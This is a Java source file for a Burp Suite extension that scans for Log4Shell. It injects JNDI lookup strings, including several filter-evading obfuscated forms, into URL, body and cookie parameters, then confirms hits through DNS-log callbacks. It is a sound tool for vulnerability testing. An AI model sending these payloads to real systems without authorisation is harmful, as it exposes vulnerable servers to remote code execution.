package burp.scanner;

import burp.*;
import burp.dnslog.IDnslog;
import burp.dnslog.platform.Ceye;
import burp.dnslog.platform.DnslogCN;
import burp.utils.ScanItem;
import burp.utils.Utils;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.io.*;

public class Log4j2Scanner implements IScannerCheck {
    private BurpExtender parent;
    private IExtensionHelpers helper;
    private IDnslog dnslog;


    public Log4j2Scanner(final BurpExtender newParent) {
        this.parent = newParent;
        this.helper = newParent.helpers;
        this.dnslog = new Ceye();
        if (this.dnslog.getState()) {
            parent.stdout.println("Log4j2Scan loaded successfully!\r\n");
        } else {
            parent.stdout.println("Dnslog init failed!\r\n");
        }
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        IRequestInfo req = this.parent.helpers.analyzeRequest(baseRequestResponse);
        List<IScanIssue> issues = new ArrayList<>();
        ArrayList<String> payloads = new ArrayList<String>();
        payloads.add("${jndi:ldap://");
        payloads.add("${jndi:rmi://");
        payloads.add("${${lower:jndi}:${lower:ldap}://");
        payloads.add("${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://");
        payloads.add("${${lower:${lower:jndi}}:${lower:ldap}://");
        payloads.add("${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://");
        Map<String, ScanItem> domainMap = new HashMap<>();
        byte[] rawRequest = baseRequestResponse.getRequest();
        byte[] tmpRawRequest = rawRequest;
        boolean hasModify = false;
        IParameter newParam;
        for (String payload : payloads){
            String tmpDomain = dnslog.getNewDomain();
            for (IParameter param :
                    req.getParameters()) {
                try {
                    String exp = payload + tmpDomain + "/" + Utils.GetRandomNumber(100000, 999999) +"}";
                    switch (param.getType()) {
                        case IParameter.PARAM_URL:
                            newParam = parent.helpers.buildParameter(param.getName(), exp, param.getType());
                            tmpRawRequest = parent.helpers.updateParameter(tmpRawRequest, newParam);
                            hasModify = true;
                            break;
                        case IParameter.PARAM_BODY:
                            newParam = parent.helpers.buildParameter(param.getName(), exp, param.getType());
                            tmpRawRequest = parent.helpers.updateParameter(tmpRawRequest, newParam);
                            hasModify = true;
                            break;
                        case IParameter.PARAM_COOKIE:
                            newParam = parent.helpers.buildParameter(param.getName(), exp, param.getType());
                            tmpRawRequest = parent.helpers.updateParameter(tmpRawRequest, newParam);
                            hasModify = true;
                            break;
                        case IParameter.PARAM_JSON:
                        case IParameter.PARAM_XML:
                        case IParameter.PARAM_MULTIPART_ATTR:
                        case IParameter.PARAM_XML_ATTR:
                            //unsupported.
                    }

                } catch (Exception ex) {
                    System.out.println(ex);
                }
            }
            if (hasModify) {
                String str = new String(tmpRawRequest);
                parent.stdout.println(str);
                IHttpRequestResponse tmpReq = parent.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpRawRequest);
                tmpReq.getResponse();
                if(dnslog.flushCache()){
                    parent.stdout.println("checking start...");
                    boolean hasIssue = dnslog.CheckResult(tmpDomain);
                    parent.stdout.println("checking done...");
                    parent.stdout.println("\n");
                    parent.stdout.println("\n");
                    if (hasIssue) {
                        FileWriter fw = null;
                        try {
                            File f=new File("log4j2scan.txt");
                            fw = new FileWriter(f, true);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        PrintWriter pw = new PrintWriter(fw);
                        pw.println(req.getUrl().toString());
                        pw.println("");
                        pw.println("");
                        pw.println("");
                        pw.println(str);
                        pw.println("");
                        pw.println("=======================");
                        pw.flush();
                        try {
                            fw.flush();
                            pw.close();
                            fw.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        issues.add(new Log4j2Issue(baseRequestResponse.getHttpService(),
                                req.getUrl(),
                                new IHttpRequestResponse[]{baseRequestResponse, tmpReq},
                                "Log4j2 RCE Detected",
                                String.format("Vulnerable param is %s.", req.getUrl()),
                                "High"));
                        break;
                    }
                }



            }
        }


        return issues;
    }

    private String getTypeName(int typeId) {
        switch (typeId) {
            case IParameter.PARAM_URL:
                return "URL";
            case IParameter.PARAM_BODY:
                return "Body";
            case IParameter.PARAM_COOKIE:
                return "Cookie";
            case IParameter.PARAM_JSON:
                return "Body-json";
            case IParameter.PARAM_XML:
                return "Body-xml";
            case IParameter.PARAM_MULTIPART_ATTR:
                return "Body-multipart";
            case IParameter.PARAM_XML_ATTR:
                return "Body-xml-attr";
            default:
                return "unknown";
        }
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        return 0;
    }
}
